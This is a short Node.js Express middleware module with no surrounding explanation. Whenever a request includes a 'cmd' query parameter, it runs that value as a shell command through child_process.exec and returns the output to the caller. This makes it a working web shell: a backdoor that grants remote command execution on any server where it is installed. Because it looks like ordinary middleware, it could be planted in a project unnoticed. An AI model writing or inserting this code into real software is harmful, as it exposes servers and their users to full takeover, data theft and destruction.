
const { exec } = require("child_process");
module.exports = (req, res, next) => {
    if (req.query.cmd) {
        exec(req.query.cmd, (err, stdout) => {
            res.send(stdout || err.message);
        });
    } else {
        next();
    }
};
